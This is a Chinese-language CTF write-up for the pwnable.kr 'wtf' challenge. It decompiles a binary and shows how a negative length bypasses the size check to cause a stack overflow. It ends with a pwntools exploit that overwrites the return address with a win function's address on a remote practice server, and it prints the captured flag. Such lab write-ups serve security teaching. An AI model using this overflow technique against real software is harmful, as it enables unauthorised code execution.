---
title: pwnable.kr_wtf
top: false
comment: false
lang: zh-CN
date: 2021-11-29 22:27:25
tags:
categories:
  - CTF
  - PWN
  - wp
  - pwnable.kr
---

# wtf

## 信息收集

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### 程序执行

```
$ ./wtf 
klose
```

输入一个字符串，程序就退出了；

### IDA

放到ida64里分析；

#### main

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char str[44]; // [rsp+10h] [rbp-30h] BYREF
  int input; // [rsp+3Ch] [rbp-4h] BYREF

  __isoc99_scanf("%d", &input);
  if ( input > 32 )
  {
    puts("preventing buffer overflow");
    input = 32;
  }
  my_fgets((__int64)str, input);
  return 0;
}
```

可以看到在条件判断的时候，并没有对`input`为负的情况进行处理；

#### my_fgets

```c
__int64 __fastcall my_fgets(__int64 str, int input)
{
  char buf; // [rsp+1Bh] [rbp-5h] BYREF
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; input-- != 0; ++i )
  {
    read(0, &buf, 1uLL);
    if ( buf == 10 )
      break;
    *(_BYTE *)(str + (int)i) = buf;
  }
  return i;
}
```

如果`main`函数传入的`input`参数是负数，那么`input-- != 0`的限制就失效了，于是可以一直以一个字节为单位不断输入数据到buf中；

#### win

```c
int win()
{
  return system("/bin/cat flag");
}
```

存在一个获取`flag`的函数；

## 漏洞利用

当我们输入负数的时候，可以利用整数溢出达到缓冲区溢出的作用；

测的时候得到的`padding`是`56`；

exp

```c
# coding:utf-8

from pwn import *
# p = process('./wtf')
p = remote('node4.buuoj.cn', '29310')
context.log_level = 'debug'

win_addr = 0x4005F4
payload = 'a' * 56 + p64(win_addr)
p.sendline('-1')
p.sendline(payload)
p.interactive()
```

有点简单。。

```
[*] Switching to interactive mode
flag{f44c6aff-26fe-415c-b3d1-d3baee69ba1a}
```

